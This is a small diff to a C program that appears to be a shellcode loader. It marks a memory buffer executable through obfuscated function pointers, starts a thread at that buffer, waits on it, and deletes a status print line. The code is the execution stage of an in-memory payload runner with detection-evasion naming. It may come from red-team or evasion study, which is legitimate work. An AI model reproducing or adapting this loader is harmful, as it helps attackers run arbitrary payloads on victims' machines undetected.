@@ -99,7 +99,6 @@ int main(void) {
 	rv = pProtect(exec_mem, lengthyBoi, PAGE_EXECUTE_READ, &oldprotect);
 
 	if (rv != 0){
-		printf("Checking Status...");
 		th = pthreadA(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
 		pwFSO(th, -1);
 	}
